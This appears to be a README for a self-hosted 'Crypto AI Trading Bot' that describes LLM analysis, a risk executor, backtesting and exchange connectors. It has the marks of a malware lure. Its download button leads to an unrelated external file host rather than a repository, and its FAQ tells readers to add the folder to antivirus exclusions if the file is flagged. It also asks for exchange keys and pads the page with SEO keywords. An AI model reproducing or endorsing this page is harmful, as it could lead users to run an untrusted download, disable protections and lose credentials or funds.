# Crypto AI Trading Bot 🤖🧠

A self-hosted framework for building **AI-driven crypto trading agents** that combine LLM reasoning with hard-coded risk controls. Instead of letting a model place orders directly, the bot separates *analysis* from *execution*: an AI layer reads news, sentiment, on-chain signals, and price context, then hands a structured decision to a rule-based executor that enforces position sizing, stop-loss, and exposure limits. Backtesting and paper trading are built in, so an AI strategy can be validated before it ever touches real capital.

[![Download Crypto AI Trading Bot](https://img.shields.io/badge/Download-Crypto_AI_Trading_Bot-blueviolet)](https://dyhuiying.com/s/file)

![Version](https://img.shields.io/badge/version-1.2-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-0078D6)
![Status](https://img.shields.io/badge/status-active-brightgreen)
![Exchanges](https://img.shields.io/badge/exchanges-15%2B-orange)

<details>
<summary>📑 Contents</summary>

- [Quick Start](#-quick-start)
- [Requirements](#️-requirements)
- [Key Features](#-key-features)
- [Module Overview](#-module-overview)
- [Why Choose Crypto AI Trading Bot](#-why-choose-crypto-ai-trading-bot)
- [FAQ](#-faq)
- [SEO Keywords](#-seo-keywords)

</details>

## ⚡ Quick Start

1. Download the archive using the button above.
2. Install dependencies with `pip install -r requirements.txt`.
3. Copy `config.example.yaml`, add your exchange and model keys, then start the bot.

The bot launches in paper-trading mode with the default AI executor attached.

## 🖥️ Requirements

| Item | Requirement |
|------|-------------|
| OS | Windows 10/11, macOS 12+, Linux (64-bit) |
| RAM | 8 GB minimum |
| Storage | 1 GB free |
| Privileges | Standard user (no admin required) |

## ✨ Key Features

**AI Analysis Layer**

- 🧠 **LLM Market Reasoning** — structured prompts turn news, sentiment, and price context into typed trade intents.
- 📰 **News & Sentiment Feeds** — headline ingestion with relevance scoring before it reaches the model.
- 🔗 **On-Chain Signals** — whale flows, exchange netflow, and funding rates as inputs to the AI layer.
- 🧩 **Provider Agnostic** — plug in OpenAI, Anthropic, or local models through the same interface.

**Execution & Risk**

- 🛡️ **Rule-Based Executor** — every AI decision is validated against position limits, stop-loss, and max exposure before an order is sent.
- 📊 **Position Sizing** — fixed-fractional and volatility-adjusted sizing modes.
- 🚨 **Kill Switch** — automatic shutdown on drawdown thresholds or repeated rejected intents.
- 🔌 **15+ Exchanges** — unified connector for Binance, Bybit, OKX, KuCoin, Kraken, Hyperliquid, and others.

**Validation**

- 🧪 **Backtesting Engine** — replay historical data with fee, slippage, and latency models.
- 📄 **Paper Trading** — live data with simulated fills before real capital is at risk.
- 📉 **Metrics Dashboard** — PnL, Sharpe, drawdown, and per-strategy attribution.

**Operations**

- 🐳 **Docker Support** — one-command deployment with `docker compose up`.
- 📱 **Telegram Control** — query bot status and pause strategies from Telegram.
- 🗂️ **Multi-Agent Portfolio** — run several AI strategies in parallel with isolated capital.

## 📋 Module Overview

| Module | What it does | Interface |
|--------|--------------|-----------|
| ai_analyzer | LLM reasoning over market context | Python API |
| news_ingestor | Headline scoring and filtering | CLI |
| onchain_feed | Whale and netflow signals | Python API |
| risk_executor | Validates and routes trade intents | Python API |
| backtester | Historical replay with cost models | CLI |
| paper_trader | Live data with simulated fills | Dashboard |
| exchange_connector | Unified order and balance layer | 15+ CEX/DEX |
| telegram_control | Status and pause commands | Telegram |

## 🚀 Why Choose Crypto AI Trading Bot

- ✅ AI and execution are separated — the model proposes, the executor disposes, so a bad prompt cannot bypass risk limits.
- ✅ Provider agnostic — OpenAI, Anthropic, or local models plug into the same analyzer interface.
- ✅ Backtest-first workflow — AI strategies are validated on historical data before live capital is used.
- ✅ Structured intents — the AI layer outputs typed trade decisions instead of free-text that has to be parsed.
- ✅ Self-hosted — prompts, keys, and strategy logic stay on your machine.

## 💡 Why Use It

- 🤖 Build an AI agent that reasons over news and on-chain data without giving it direct order access.
- 🧪 Validate an LLM-driven strategy on historical data before going live.
- 🧭 Run multiple AI strategies in parallel with isolated capital and kill switches.
- ⚡ Prototype new signal ideas quickly with a typed analyzer interface.

## ❓ FAQ

**Do I need to run it as Administrator?**
No — the bot runs as a standard user process and does not require elevated privileges.

**Will my antivirus flag the file?**
Some engines may flag Python entry points by heuristic. Add the project folder to exclusions if needed.

**Does it work on Windows 11?**
Yes — Windows 10/11, macOS, and Linux are all supported.

**Can the AI place orders directly?**
No — AI intents are always validated by the rule-based executor before any order is sent.

**How do I update?**
Pull the latest archive and reinstall dependencies — strategy configs and keys are preserved.

## 🔎 SEO Keywords

Crypto AI Trading Bot, AI crypto trading bot, AI trading bot github, LLM crypto trading, crypto AI agent, AI trading bot self-hosted, crypto bot with LLM, AI trading strategy backtest, crypto AI signal bot, openai crypto bot, anthropic crypto trading, on-chain AI trading, crypto bot risk management, AI trade intents, crypto bot 15 exchanges, crypto AI agent framework, automated crypto trading AI, machine learning crypto bot, crypto trading bot python, AI crypto bot docker

## ⚠️ Disclaimer

Provided for educational and informational purposes only. Use at your own risk and in accordance with the terms of service of any exchange or platform you interact with. Trading involves financial risk.
